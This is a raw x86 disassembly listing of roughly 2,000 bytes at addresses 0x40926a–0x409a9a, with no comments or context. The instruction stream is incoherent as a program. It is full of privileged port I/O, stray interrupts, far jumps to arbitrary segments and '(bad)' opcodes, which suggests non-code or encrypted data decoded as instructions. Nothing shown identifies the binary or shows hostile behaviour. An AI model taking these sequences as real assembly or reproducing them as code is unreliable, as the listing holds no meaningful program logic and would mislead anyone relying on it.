  40926a:	adc    bh,BYTE PTR [edi-0x63]
  40926d:	pop    esi
  40926e:	add    al,0x70
  409270:	cs sbb ebp,edx
  409273:	cmp    DWORD PTR [eax-0x6a4de97d],ebx
  409279:	sub    bl,cl
  40927b:	addr16 cwde 
  40927d:	jge    0x409234
  40927f:	push   ds
  409280:	je     0x4092ae
  409282:	rol    BYTE PTR [ebx],cl
  409284:	outs   dx,BYTE PTR ds:[esi]
  409285:	fstp   DWORD PTR [esi]
  409287:	int3   
  409288:	push   ebx
  409289:	xor    BYTE PTR [esi+0x67],bh
  40928c:	in     eax,dx
  40928d:	inc    edi
  40928e:	mov    BYTE PTR [ecx],ah
  409290:	mov    ds:0x4e5c2548,al
  409295:	inc    edx
  409296:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409297:	xchg   BYTE PTR [ebp+0x3119bc31],ah
  40929d:	rcl    DWORD PTR [ebx+0x721857d9],cl
  4092a3:	ficomp DWORD PTR [esi-0x62613cc4]
  4092a9:	xor    ebx,DWORD PTR [edx+0x43]
  4092ac:	or     ebp,0xfffffff5
  4092af:	pop    ss
  4092b0:	jmp    0x409281
  4092b2:	in     al,0x7a
  4092b4:	outs   dx,BYTE PTR ds:[esi]
  4092b5:	loope  0x409243
  4092b7:	das    
  4092b8:	adc    DWORD PTR [edi-0x6af5b3f7],edi
  4092be:	fst    QWORD PTR [edx-0x4948163a]
  4092c4:	cmp    ebx,DWORD PTR [ecx+0x7aea26e4]
  4092ca:	enter  0x46ce,0x94
  4092ce:	jmp    0x15:0x8f564fce
  4092d5:	adc    DWORD PTR [esi+0x71b8c2e],eax
  4092db:	mov    eax,DWORD PTR [eax+0x8]
  4092de:	cmp    al,0x3c
  4092e0:	or     eax,0x299b37c0
  4092e5:	adc    bl,bh
  4092e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092e8:	sahf   
  4092e9:	mov    edx,DWORD PTR [edx-0x451292e4]
  4092ef:	icebp  
  4092f0:	sub    DWORD PTR [edi],esp
  4092f2:	fcom   DWORD PTR [ecx]
  4092f4:	pop    esi
  4092f5:	outs   dx,DWORD PTR ds:[esi]
  4092f6:	rcr    DWORD PTR [edi],1
  4092f8:	dec    esi
  4092f9:	mov    al,ds:0x1ceab679
  4092fe:	loop   0x40933f
  409300:	sub    al,0x1b
  409302:	dec    edi
  409303:	es call 0x5e97:0xf0c5054f
  40930b:	and    ecx,0x9
  40930e:	cdq    
  40930f:	xor    al,0xdd
  409311:	stos   DWORD PTR es:[edi],eax
  409312:	ret    0x478d
  409315:	int    0xb1
  409317:	jb     0x40929f
  409319:	es shl bh,1
  40931c:	gs mov al,gs:0xd3dc120c
  409323:	ja     0x409346
  409325:	call   0x7e8:0x4327822b
  40932c:	cld    
  40932d:	mov    al,0xe3
  40932f:	sbb    BYTE PTR [ecx-0x523c4dbb],bh
  409335:	sub    bl,bh
  409337:	jnp    0x4092d0
  409339:	aas    
  40933a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40933b:	out    0xd3,eax
  40933d:	mov    BYTE PTR [edi+0xc],al
  409340:	dec    edi
  409341:	jnp    0x40938c
  409343:	push   ebp
  409344:	jo     0x409305
  409346:	mov    WORD PTR [edx-0x3aa824fe],gs
  40934c:	aas    
  40934d:	push   edi
  40934e:	sbb    BYTE PTR [ebp+0x6ad140d4],ch
  409354:	xchg   edx,eax
  409355:	mov    edi,DWORD PTR [ebx-0x71]
  409358:	sbb    dl,al
  40935a:	das    
  40935b:	or     cl,BYTE PTR [ecx]
  40935d:	push   ebx
  40935e:	shl    DWORD PTR [esi+0x8],cl
  409361:	and    DWORD PTR [edi+eiz*4+0x4c484cb],esp
  409368:	inc    esi
  409369:	bound  eax,QWORD PTR [edx]
  40936b:	retf   
  40936c:	mov    ds:0xf6604d02,eax
  409371:	mov    dh,0x69
  409373:	jb     0x409363
  409375:	mov    edi,0x811fc5df
  40937a:	popa   
  40937b:	ds pusha 
  40937d:	ss enter 0x80fe,0xc2
  409382:	jo     0x732dd25f
  409388:	sub    DWORD PTR [ecx+0x50781541],eax
  40938e:	sub    eax,0xfc639373
  409394:	test   al,0x93
  409396:	icebp  
  409397:	mov    edx,0x9728c360
  40939c:	jp     0x409386
  40939e:	sub    bh,BYTE PTR [esi]
  4093a0:	mov    DWORD PTR [ecx-0xc],eax
  4093a3:	and    bh,dh
  4093a5:	out    0xf,al
  4093a7:	xor    ah,BYTE PTR [eax]
  4093a9:	stc    
  4093aa:	xor    eax,0xbf266867
  4093af:	aam    0x42
  4093b1:	push   ebx
  4093b2:	push   0x2e
  4093b4:	sbb    edx,DWORD PTR [edx-0x507910a6]
  4093ba:	xor    DWORD PTR [ebx+0x17],0x39
  4093be:	das    
  4093bf:	push   ds
  4093c0:	outs   dx,BYTE PTR ds:[esi]
  4093c1:	dec    edx
  4093c2:	clc    
  4093c3:	mov    esp,0xb0df14b0
  4093c8:	mov    gs,WORD PTR [edi+0x10816465]
  4093ce:	cli    
  4093cf:	jg     0x40935c
  4093d1:	sahf   
  4093d2:	mov    ebp,0xb332dd13
  4093d7:	cmc    
  4093d8:	popf   
  4093d9:	push   ss
  4093da:	and    DWORD PTR [ebx],0xfffffffd
  4093dd:	xor    ah,BYTE PTR [ebx]
  4093df:	pop    edx
  4093e0:	ror    BYTE PTR [edx-0x3a],1
  4093e3:	jmp    0x9339:0xf04dd8f7
  4093ea:	inc    esi
  4093eb:	push   ebp
  4093ec:	mov    dl,0x3
  4093ee:	fs out dx,eax
  4093f0:	push   eax
  4093f1:	aaa    
  4093f2:	cmp    eax,0x5400f707
  4093f7:	fadd   QWORD PTR [edi]
  4093f9:	bnd jmp 0x409463
  4093fc:	fs arpl bp,dx
  4093ff:	sbb    dl,BYTE PTR [esi-0x3b4a18ca]
  409405:	mov    ebx,0x312e768d
  40940a:	and    ebx,esp
  40940c:	add    eax,0x80da8876
  409411:	dec    edi
  409412:	hlt    
  409413:	cmc    
  409414:	push   0xffffffa8
  409416:	mov    ebp,edi
  409418:	fcom   st(7)
  40941a:	mov    WORD PTR [edx-0x17e3a80e],es
  409420:	sub    al,0xa4
  409422:	xchg   ebx,eax
  409423:	xchg   edx,eax
  409424:	or     DWORD PTR [edx+0x9f7ca94],0x18
  40942b:	stos   DWORD PTR es:[edi],eax
  40942c:	xchg   ecx,eax
  40942d:	xor    BYTE PTR [esi+0x7ac07c5d],bh
  409433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409434:	dec    eax
  409435:	and    eax,0x7f750107
  40943a:	das    
  40943b:	and    ch,BYTE PTR [ecx]
  40943d:	aad    0x99
  40943f:	clflush BYTE PTR [edx+0x476e1e34]
  409446:	outs   dx,BYTE PTR ds:[esi]
  409447:	add    al,0xab
  409449:	inc    cx
  40944b:	push   esp
  40944c:	ss iret 
  40944e:	mov    ss,WORD PTR [eax]
  409450:	pop    es
  409451:	stos   BYTE PTR es:[edi],al
  409452:	push   esi
  409453:	add    DWORD PTR [edi+0x2f3fa463],0x20
  40945a:	test   eax,0xaa34f07c
  40945f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409460:	jmp    0x40947d
  409462:	dec    eax
  409463:	dec    ebp
  409464:	out    dx,eax
  409465:	repz dec esp
  409467:	or     al,0x8b
  409469:	mov    al,ds:0xba8e77ac
  40946e:	push   ecx
  40946f:	retf   0x97f7
  409472:	push   edi
  409473:	jae    0x40941b
  409475:	lea    esp,[edx-0x41d2d4b]
  40947b:	mov    ds:0xd80416d0,al
  409480:	mov    DWORD PTR [edi-0x5d],esp
  409483:	or     ch,BYTE PTR [esi-0x44e29919]
  409489:	pushf  
  40948a:	shr    DWORD PTR ss:[ecx],0xe
  40948e:	or     eax,0xb749c690
  409493:	shr    esp,cl
  409495:	arpl   WORD PTR [ecx-0x98656bf],bx
  40949b:	out    dx,al
  40949c:	fs jg  0x4094cc
  40949f:	sub    cl,0x8
  4094a2:	jo     0x4094fb
  4094a4:	mov    ch,0xf8
  4094a6:	mov    bl,0xcf
  4094a8:	int    0xee
  4094aa:	or     BYTE PTR [ecx],dh
  4094ac:	adc    al,0x11
  4094ae:	ficom  WORD PTR ds:0x26cda378
  4094b4:	inc    DWORD PTR [eax-0x2b]
  4094b7:	mov    ebp,0xb357ae9
  4094bc:	jbe    0x4094ca
  4094be:	sti    
  4094bf:	ja     0x409530
  4094c1:	inc    eax
  4094c2:	icebp  
  4094c3:	ins    BYTE PTR es:[edi],dx
  4094c4:	test   al,0xbf
  4094c6:	das    
  4094c7:	and    BYTE PTR [edx],bl
  4094c9:	(bad)  
  4094ca:	jg     0x4094ab
  4094cc:	adc    eax,0xb8e1c0f9
  4094d1:	xor    esp,DWORD PTR [edx-0x38]
  4094d4:	jbe    0x409463
  4094d6:	mov    DWORD PTR [esi+0x7194d79],edx
  4094dc:	and    al,0xe3
  4094de:	xchg   edx,esi
  4094e0:	nop
  4094e1:	loop   0x4094d8
  4094e3:	mov    eax,ds:0xc3216c8e
  4094e8:	ss sbb edi,ebp
  4094eb:	je     0x4094ae
  4094ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094ee:	jl     0x409526
  4094f0:	retf   
  4094f1:	mov    BYTE PTR [edx+ecx*4+0x67e509eb],bl
  4094f8:	push   ds
  4094f9:	call   0xbfd1:0x9ec81c38
  409500:	inc    esi
  409501:	pop    esp
  409502:	test   eax,0xa2808d34
  409507:	inc    esp
  409508:	mov    dl,0xa6
  40950a:	xlat   BYTE PTR ds:[ebx]
  40950b:	inc    ecx
  40950c:	stos   BYTE PTR es:[edi],al
  40950d:	loop   0x4094df
  40950f:	mov    ds:0xcac61ff2,eax
  409514:	aad    0x84
  409516:	nop
  409517:	mov    ch,BYTE PTR [ebp-0x9]
  40951a:	rcl    DWORD PTR [edi],1
  40951c:	add    eax,0xda10c531
  409521:	iret   
  409522:	xor    edx,DWORD PTR [ecx]
  409524:	pop    edx
  409525:	jbe    0x4094d2
  409527:	fbld   TBYTE PTR [ebx+0x222aa8a6]
  40952d:	jge    0x4094cd
  40952f:	call   0xab09:0x773505a5
  409536:	adc    DWORD PTR [eax+0x3e],esp
  409539:	pop    ebx
  40953a:	and    dl,BYTE PTR [ebx+0x40bb8e91]
  409540:	push   edi
  409541:	dec    edx
  409542:	dec    ebx
  409543:	lock gs call 0x10a5eb5f
  40954a:	dec    esi
  40954b:	mov    ds:0x7f5d0725,al
  409550:	mov    ds:0x2502f50b,eax
  409555:	mov    al,0xff
  409557:	(bad)  
  409558:	sbb    edi,ebp
  40955a:	enter  0x7a92,0x52
  40955e:	sbb    al,0x44
  409560:	and    al,0xe
  409562:	and    DWORD PTR [edx],ecx
  409564:	sti    
  409565:	sbb    al,0x1e
  409567:	or     dl,BYTE PTR [ebx+0x18bafb8]
  40956d:	cli    
  40956e:	mov    edi,0xac3842f6
  409573:	daa    
  409574:	(bad)  
  409575:	pop    ss
  409576:	xor    esi,esp
  409578:	cmp    al,0x2f
  40957a:	ficomp WORD PTR ds:0x27431b26
  409580:	mov    bh,0x85
  409582:	lods   al,BYTE PTR ds:[esi]
  409583:	dec    ebp
  409584:	adc    edx,edx
  409586:	dec    ebx
  409587:	shl    ebp,1
  409589:	cmp    bl,BYTE PTR [edx-0x71f803ba]
  40958f:	fst    QWORD PTR [eax-0x3d]
  409592:	jg     0x409601
  409594:	dec    ebx
  409595:	iret   
  409596:	(bad)  [ebp+0x7e31b4ff]
  40959c:	test   DWORD PTR [edi-0x22fb2c35],esi
  4095a2:	fidiv  WORD PTR [edi-0x17]
  4095a5:	shl    DWORD PTR [ebp+0x3e7559cf],0xcc
  4095ac:	clc    
  4095ad:	add    DWORD PTR ds:0x33cdbf85,0x526e88a7
  4095b7:	int3   
  4095b8:	dec    eax
  4095b9:	sahf   
  4095ba:	pop    es
  4095bb:	dec    esp
  4095bc:	test   ebp,edx
  4095be:	cdq    
  4095bf:	jb     0x4095ac
  4095c1:	mov    ds:0xbbae03ba,al
  4095c6:	add    al,0x25
  4095c8:	push   DWORD PTR [ebp-0x8]
  4095cb:	mov    esp,DWORD PTR [eax]
  4095cd:	xchg   esi,ecx
  4095cf:	xchg   ebp,eax
  4095d0:	pop    ebx
  4095d1:	stos   BYTE PTR es:[edi],al
  4095d2:	popf   
  4095d3:	jg     0x4095f4
  4095d5:	mov    al,0xd0
  4095d7:	sub    BYTE PTR [ecx],dh
  4095d9:	int    0x1f
  4095db:	sbb    eax,0x3692ca60
  4095e0:	push   0x2ed2f912
  4095e5:	cdq    
  4095e6:	or     eax,0xa1d36ee0
  4095eb:	stos   DWORD PTR es:[edi],eax
  4095ec:	jg     0x409634
  4095ee:	pop    edx
  4095ef:	call   0x6fe354b
  4095f4:	xor    al,0xa5
  4095f6:	xor    ah,ch
  4095f8:	sbb    al,0xe2
  4095fa:	push   esp
  4095fb:	fmul   DWORD PTR [esi-0x16]
  4095fe:	pop    esp
  4095ff:	out    0xb2,al
  409601:	les    eax,FWORD PTR [ecx+0x24]
  409604:	out    dx,al
  409605:	adc    bh,dl
  409607:	(bad)  
  409608:	jp     0x409616
  40960a:	jl     0x4095b3
  40960c:	mov    dl,0xea
  40960e:	and    dh,BYTE PTR [eax+eax*1-0x28]
  409612:	sub    ch,BYTE PTR [ebx-0x77be050f]
  409618:	mov    edi,0x936a750c
  40961d:	js     0x409662
  40961f:	xor    ebp,DWORD PTR [edi]
  409621:	sti    
  409622:	adc    DWORD PTR [esi-0x3],esi
  409625:	add    edx,0x1cf26052
  40962b:	arpl   bp,ax
  40962d:	mov    al,ds:0x99e71d69
  409632:	hlt    
  409633:	ds xchg ecx,eax
  409635:	push   0x1728bfae
  40963a:	sbb    al,0x4e
  40963c:	inc    ecx
  40963d:	in     ax,0xb6
  409640:	dec    esi
  409641:	daa    
  409642:	pop    edx
  409643:	cli    
  409644:	pushf  
  409645:	sub    DWORD PTR ds:0x19d92d71,0xf00f65e
  40964f:	cli    
  409650:	test   DWORD PTR [ebp+0x601cc24],eax
  409656:	sbb    BYTE PTR [esi-0x1a84a893],dh
  40965c:	aam    0x71
  40965e:	out    dx,eax
  40965f:	data16 sub BYTE PTR [ebx],cl
  409662:	sti    
  409663:	xor    DWORD PTR [edi],esi
  409665:	push   ecx
  409667:	fs addr16 pop esp
  40966a:	call   0x524bff73
  40966f:	fwait
  409670:	scas   al,BYTE PTR es:[edi]
  409671:	and    eax,0x649f917
  409676:	mov    eax,0x65747652
  40967b:	or     eax,DWORD PTR [esi]
  40967d:	pop    eax
  40967e:	inc    ebp
  40967f:	push   ds
  409680:	push   0xffffffd9
  409682:	jno    0x409677
  409684:	mov    eax,0x7b9349bf
  409689:	mov    ch,0xde
  40968b:	lods   al,BYTE PTR ds:[esi]
  40968c:	inc    esp
  40968d:	bswap  eax
  40968f:	out    0x24,al
  409691:	scas   eax,DWORD PTR es:[edi]
  409692:	xchg   ebx,eax
  409693:	cmp    ecx,ebp
  409695:	ja     0x409661
  409697:	jns    0x409682
  409699:	aas    
  40969a:	in     al,dx
  40969b:	lds    ecx,FWORD PTR ds:0x64bc39a1
  4096a1:	or     DWORD PTR [ebp-0x4b667953],ebp
  4096a7:	popa   
  4096a8:	(bad)  
  4096a9:	icebp  
  4096aa:	sub    esp,DWORD PTR [ebp+0x27]
  4096ad:	pop    DWORD PTR [ebp+0x2a14c3c0]
  4096b3:	out    0x3e,al
  4096b5:	jne    0x4096ff
  4096b7:	or     DWORD PTR [eax-0x19fdda84],ecx
  4096bd:	cwde   
  4096be:	push   0x2cd1316c
  4096c3:	retf   0x9e09
  4096c6:	sub    eax,0xce547ad3
  4096cb:	mov    cl,0x61
  4096cd:	sti    
  4096ce:	cmp    eax,0xcb350fda
  4096d3:	jbe    0x409680
  4096d5:	mov    edx,0x2ee4af3a
  4096da:	js     0x40972c
  4096dc:	ss inc ebx
  4096de:	loopne 0x40970b
  4096e0:	fwait
  4096e1:	sub    al,0x60
  4096e3:	cmp    ah,dl
  4096e5:	push   ss
  4096e6:	(bad)  
  4096e7:	lods   eax,DWORD PTR ds:[esi]
  4096e8:	stc    
  4096e9:	sub    ebx,edx
  4096eb:	mov    ch,0xc8
  4096ed:	and    dh,BYTE PTR [ecx-0x53]
  4096f0:	lahf   
  4096f1:	shl    DWORD PTR [ecx],0xf8
  4096f4:	mov    esi,0xaf3e5b5b
  4096f9:	mov    dl,al
  4096fb:	xor    al,BYTE PTR [ecx+0x325017c9]
  409701:	imul   esi,DWORD PTR [edx],0xdf608fd6
  409707:	xor    DWORD PTR [eax+ebx*2+0x35],esp
  40970b:	inc    ebp
  40970c:	sub    DWORD PTR [ecx-0x181dff02],edi
  409712:	or     ebx,edx
  409714:	push   ss
  409715:	inc    edi
  409716:	mov    ?,WORD PTR [edi-0x583e7e8f]
  40971c:	loope  0x4096db
  40971e:	dec    ebp
  40971f:	and    eax,0x27902c39
  409724:	sbb    DWORD PTR [ecx+0x30],ebx
  409727:	adc    eax,0xa1fb60b9
  40972c:	jl     0x409784
  40972e:	stc    
  40972f:	push   eax
  409730:	mov    eax,ds:0xf5fb994d
  409735:	stos   DWORD PTR es:[edi],eax
  409736:	jb     0x4097a3
  409738:	in     eax,dx
  409739:	std    
  40973a:	or     eax,0x4ae21559
  40973f:	repz jnp 0x409741
  409742:	and    ah,BYTE PTR [eax+ebp*8+0xd]
  409746:	jge    0x4096f1
  409748:	stos   DWORD PTR es:[edi],eax
  409749:	dec    edx
  40974a:	or     eax,0xfa110034
  40974f:	scas   al,BYTE PTR es:[edi]
  409750:	nop
  409751:	out    0xff,eax
  409753:	sub    al,0x8f
  409756:	lock xchg esp,eax
  409758:	inc    ebx
  409759:	jmp    0x283236d0
  40975e:	jo     0x409791
  409760:	add    BYTE PTR [eax-0x17347ee0],al
  409766:	cmp    al,0xce
  409768:	arpl   WORD PTR [esi],bp
  40976a:	aas    
  40976b:	mov    esi,0x487e2d33
  409770:	aaa    
  409771:	les    esi,FWORD PTR [ecx+0xe099e4e]
  409777:	xchg   ebx,eax
  409778:	loope  0x4097eb
  40977a:	addr16 test al,0x56
  40977d:	es int 0xc4
  409780:	clc    
  409781:	mov    bl,0x91
  409783:	pop    eax
  409784:	(bad)  
  409785:	loope  0x40977c
  409787:	dec    ebx
  409788:	outs   dx,DWORD PTR ds:[esi]
  409789:	(bad)  
  40978a:	hlt    
  40978b:	adc    DWORD PTR [eax],ebp
  40978d:	dec    ebx
  40978e:	inc    edx
  40978f:	and    al,0xe6
  409791:	mov    bh,0xeb
  409793:	mov    bh,0xa7
  409795:	push   cs
  409796:	imul   esi,DWORD PTR [edi+0x7a992882],0x40cc367c
  4097a0:	inc    edi
  4097a1:	std    
  4097a2:	cmp    al,0x31
  4097a4:	ins    BYTE PTR es:[edi],dx
  4097a5:	jae    0x4097d8
  4097a7:	fcomp  QWORD PTR [edi+0x34]
  4097aa:	jbe    0x409755
  4097ac:	jg     0x409765
  4097ae:	in     eax,0x3d
  4097b0:	inc    ebx
  4097b1:	mov    ch,0x94
  4097b3:	pop    edx
  4097b4:	lds    esi,FWORD PTR [eax+0x6b]
  4097b7:	sub    BYTE PTR [ebp+0x29215541],ch
  4097bd:	sbb    al,0x6b
  4097bf:	in     eax,0x9a
  4097c1:	cld    
  4097c2:	mov    ds:0xf64f3f72,al
  4097c7:	jge    0x409829
  4097c9:	jmp    0x7a4cecdb
  4097ce:	cmp    eax,0x286413
  4097d3:	ja     0x40984b
  4097d5:	and    eax,0x2c48d606
  4097da:	push   cs
  4097db:	and    al,0x5f
  4097dd:	jbe    0x4097e8
  4097df:	xchg   BYTE PTR [eax-0x3f],bl
  4097e2:	outs   dx,BYTE PTR ds:[esi]
  4097e3:	mov    esi,0xab3671f2
  4097e8:	fwait
  4097e9:	sub    ecx,DWORD PTR [esi-0xc]
  4097ec:	or     DWORD PTR [eax-0x74],esp
  4097ef:	jge    0x4097d8
  4097f1:	fdiv   QWORD PTR [ebx-0x7fcbea3b]
  4097f7:	shl    BYTE PTR [ebx-0x2b008226],0xcc
  4097fe:	out    dx,al
  4097ff:	mov    WORD PTR [ecx-0x4f610681],?
  409805:	lods   al,BYTE PTR ds:[esi]
  409806:	std    
  409807:	jp     0x40983e
  409809:	or     al,0x4c
  40980b:	sbb    esi,0x782c8fc4
  409811:	xchg   DWORD PTR [ecx+0x26],esp
  409814:	sub    BYTE PTR [edx+eiz*2],ah
  409817:	mov    ds,WORD PTR [edi+0x3d69f437]
  40981d:	pop    edx
  40981e:	sub    BYTE PTR [edx-0x41],ch
  409821:	xchg   esp,eax
  409822:	pop    esi
  409823:	and    eax,0xe7ad4a4a
  409828:	mov    bl,ah
  40982a:	(bad)  
  40982b:	dec    ebx
  40982c:	dec    esp
  40982d:	mov    esi,eax
  40982f:	inc    ebp
  409830:	xchg   ecx,eax
  409831:	outs   dx,BYTE PTR ds:[esi]
  409832:	mov    ebp,0x9be922a
  409837:	mov    edx,0x969e986e
  40983c:	pop    ss
  40983d:	pop    eax
  40983e:	rcr    BYTE PTR [eax+eax*8],cl
  409841:	mov    edi,0xe53dd3e
  409846:	xchg   ebp,eax
  409847:	and    DWORD PTR [ebx],0x4c
  40984a:	call   0x4b073be6
  40984f:	mov    ebp,esi
  409851:	sbb    BYTE PTR [ecx],al
  409853:	test   al,0x59
  409855:	add    DWORD PTR [eax],ecx
  409857:	cmp    dl,al
  409859:	mul    BYTE PTR [eax+0x58]
  40985c:	fs jae 0x40981f
  40985f:	ds mov esi,0x91d582bb
  409865:	adc    DWORD PTR [edx],0x5a1e3e70
  40986b:	scas   al,BYTE PTR es:[edi]
  40986c:	push   cs
  40986d:	or     DWORD PTR [esi-0x2],edx
  409870:	aam    0x97
  409872:	(bad)  
  409873:	push   ebx
  409874:	mov    edi,0x8accfd85
  409879:	inc    edi
  40987a:	adc    BYTE PTR [esi+0x55d15905],ah
  409880:	(bad)  
  409881:	test   bl,0x47
  409884:	gs sahf 
  409886:	out    0x13,eax
  409888:	lods   eax,DWORD PTR ds:[esi]
  409889:	call   0x3fbc:0x7fc0037d
  409890:	pusha  
  409891:	mov    al,ds:0x35d66c3b
  409896:	dec    ebx
  409897:	test   DWORD PTR [bp+si+0x76],0xe16ad2a8
  40989f:	iret   
  4098a0:	aad    0x6
  4098a2:	xor    al,0x1e
  4098a4:	mov    dl,0xb7
  4098a6:	dec    si
  4098a8:	or     eax,0x93f19ba
  4098ad:	jnp    0x4098ab
  4098af:	pop    es
  4098b0:	jmp    DWORD PTR [esi-0x2f966fd3]
  4098b6:	mov    edi,0xaf588e9f
  4098bb:	xchg   ecx,eax
  4098bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098bd:	pop    es
  4098be:	pop    esi
  4098bf:	add    ah,BYTE PTR [ebx+0x2ebbc388]
  4098c5:	adc    BYTE PTR [ebx-0x2f],bl
  4098c8:	pop    ss
  4098c9:	out    0x58,eax
  4098cb:	aad    0x15
  4098cd:	push   0xffe423ce
  4098d2:	inc    ebx
  4098d3:	ins    DWORD PTR es:[edi],dx
  4098d4:	test   BYTE PTR [ebx],al
  4098d6:	dec    ecx
  4098d7:	out    dx,eax
  4098d8:	icebp  
  4098d9:	fiadd  DWORD PTR [eax-0x309c3038]
  4098df:	mov    bh,0xfd
  4098e1:	push   edx
  4098e2:	adc    DWORD PTR [eax+edx*4+0x75211581],eax
  4098e9:	xor    esp,DWORD PTR [edi]
  4098eb:	lock and eax,0xdd23931e
  4098f1:	push   eax
  4098f2:	mov    bh,0x9
  4098f4:	test   al,0x3f
  4098f6:	mov    ax,ds:0x43ba8c9e
  4098fc:	jae    0x4098b6
  4098fe:	cmp    DWORD PTR [esi+0x71],eax
  409901:	inc    ebx
  409902:	ja     0x40997f
  409904:	cs or  al,0xbf
  409908:	push   ss
  409909:	loop   0x40991f
  40990b:	push   esp
  40990c:	push   0x34d56e7d
  409911:	cmp    al,BYTE PTR [ebx+0x60]
  409914:	push   0x7
  409916:	stos   DWORD PTR es:[edi],eax
  409917:	mov    ds:0x905f5008,al
  40991c:	push   edi
  40991d:	das    
  40991e:	popf   
  40991f:	ror    al,cl
  409921:	jge    0x40999d
  409923:	cvtps2pd xmm6,QWORD PTR [edi]
  409926:	pop    ds
  409927:	inc    edx
  409928:	mov    eax,gs
  40992a:	push   0x50a74109
  40992f:	adc    al,0x1e
  409931:	gs mov dh,0xe7
  409934:	mov    dl,0xf8
  409936:	test   al,0x3c
  409938:	(bad)  
  409939:	adc    BYTE PTR [ebp-0x6dc0cb0d],bl
  40993f:	and    dl,BYTE PTR [ecx+0x1e6516d7]
  409945:	and    edi,DWORD PTR [eax]
  409947:	shl    BYTE PTR [ebp+0x17],0x69
  40994b:	sbb    eax,0x6dbe567f
  409950:	aam    0x5
  409952:	mov    al,ds:0xf2eb500d
  409957:	cwde   
  409958:	push   0x70
  40995a:	or     al,0x7f
  40995c:	ds jnp 0x409935
  40995f:	sub    al,cl
  409961:	inc    edi
  409962:	addr16 push 0x3c0b0188
  409968:	sbb    esp,DWORD PTR [ebp+0x4c7efe57]
  40996e:	mov    ebp,ebp
  409970:	inc    esp
  409971:	sub    BYTE PTR [ecx-0x5dc7a483],ch
  409977:	bound  ebx,QWORD PTR [ebx+0x4b]
  40997a:	je     0x409923
  40997c:	adc    BYTE PTR [ecx-0x2f],dl
  40997f:	loope  0x4099df
  409981:	stos   DWORD PTR es:[edi],eax
  409982:	cmp    BYTE PTR [ebx-0x65],ah
  409985:	dec    edi
  409986:	push   ebx
  409987:	test   dl,bl
  409989:	ds jno 0x409964
  40998c:	imul   eax,DWORD PTR [ebx],0x50
  40998f:	xchg   DWORD PTR [ecx],edx
  409991:	scas   eax,DWORD PTR es:[edi]
  409992:	add    al,0xdc
  409994:	outs   dx,BYTE PTR ds:[esi]
  409995:	in     eax,dx
  409996:	in     eax,dx
  409997:	stos   BYTE PTR es:[edi],al
  409998:	test   eax,0x360d5326
  40999d:	push   esp
  40999e:	sahf   
  40999f:	xor    cl,BYTE PTR [ebx+0x77]
  4099a2:	mov    ds:0x51f8e871,al
  4099a7:	or     BYTE PTR [edi-0x1bbc77cc],bh
  4099ad:	xor    DWORD PTR [ebx+0x6d],esp
  4099b0:	add    DWORD PTR [ecx],esi
  4099b2:	test   al,0xba
  4099b4:	aad    0x65
  4099b6:	mov    ecx,DWORD PTR [edx-0x59608e8d]
  4099bc:	mov    al,0x41
  4099be:	xor    ecx,DWORD PTR [ebp+0x4e7ecf9c]
  4099c4:	bound  esi,QWORD PTR [edx+0x1bb0157d]
  4099ca:	adc    WORD PTR [ebp+0x50],bx
  4099ce:	inc    edi
  4099cf:	push   ecx
  4099d0:	xor    ebp,ebp
  4099d2:	jmp    0x409958
  4099d4:	enter  0xdb34,0xd0
  4099d8:	dec    eax
  4099d9:	jge    0x40999d
  4099db:	out    0x67,al
  4099dd:	in     eax,dx
  4099de:	es jp  0x4099ac
  4099e1:	or     DWORD PTR [edi],eax
  4099e3:	int3   
  4099e4:	nop
  4099e5:	sar    BYTE PTR ds:0x6d8c6b2a,0xd
  4099ec:	mul    BYTE PTR [esi-0x211cebb6]
  4099f2:	repz imul DWORD PTR [eax-0x18d94991]
  4099f9:	inc    edx
  4099fa:	sar    ch,0xc8
  4099fd:	(bad)  
  4099ff:	jle    0x4099f0
  409a01:	add    ebx,edx
  409a03:	in     al,dx
  409a04:	mov    bl,0xa5
  409a06:	std    
  409a07:	mov    ebp,DWORD PTR [eax]
  409a09:	dec    ecx
  409a0a:	pop    ecx
  409a0b:	adc    BYTE PTR [eax],dl
  409a0d:	pop    ss
  409a0e:	push   cs
  409a0f:	pop    ecx
  409a10:	mov    dh,0x57
  409a12:	outs   dx,DWORD PTR ds:[esi]
  409a13:	xor    ebx,edx
  409a15:	push   esp
  409a16:	xor    ebp,esp
  409a18:	sar    BYTE PTR [eax],1
  409a1a:	fs int 0xab
  409a1d:	add    dl,0x32
  409a20:	push   ecx
  409a21:	mov    esp,0x725cba5e
  409a26:	int3   
  409a27:	fldenv [edx]
  409a29:	stc    
  409a2a:	jne    0x409aa5
  409a2c:	retf   
  409a2d:	xchg   esp,eax
  409a2e:	jnp    0x409aaa
  409a30:	mov    ds:0x9eaeaa69,al
  409a35:	int    0x9d
  409a37:	pop    edx
  409a38:	mov    dh,0xa3
  409a3a:	outs   dx,BYTE PTR ds:[esi]
  409a3b:	mov    esp,0x4b14201f
  409a40:	clc    
  409a41:	mov    ebx,0x98fd2602
  409a46:	or     BYTE PTR [esi-0x7f63bfa1],ah
  409a4c:	or     BYTE PTR [esi-0x3b],ch
  409a4f:	or     ebx,DWORD PTR [ebx+0x1a593b96]
  409a55:	jecxz  0x409a7e
  409a57:	aad    0x86
  409a59:	in     eax,0x48
  409a5b:	jmp    0x497d:0x8ab57bf
  409a62:	fwait
  409a63:	adc    eax,DWORD PTR [ebx+ebp*8]
  409a66:	into   
  409a67:	and    DWORD PTR [edx],ebp
  409a69:	xor    BYTE PTR gs:[ebx-0x65],bl
  409a6d:	outs   dx,DWORD PTR ds:[esi]
  409a6e:	(bad)  
  409a6f:	js     0x409ac8
  409a71:	add    al,0x97
  409a73:	jge    0x409a62
  409a75:	ss push eax
  409a77:	in     eax,dx
  409a78:	int    0x27
  409a7a:	js     0x409aae
  409a7c:	das    
  409a7d:	in     al,0xd0
  409a7f:	stc    
  409a80:	lea    edx,[edi+0x75]
  409a83:	out    dx,eax
  409a84:	mov    al,ds:0x16d9d653
  409a89:	daa    
  409a8a:	inc    ecx
  409a8b:	xchg   esp,eax
  409a8c:	sbb    cl,bl
  409a8e:	jl     0x409a53
  409a90:	lock fistp WORD PTR [ebp-0x1225b9c3]
  409a97:	sub    DWORD PTR [edx-0x3a],esi
  409a9a:	dec    edx
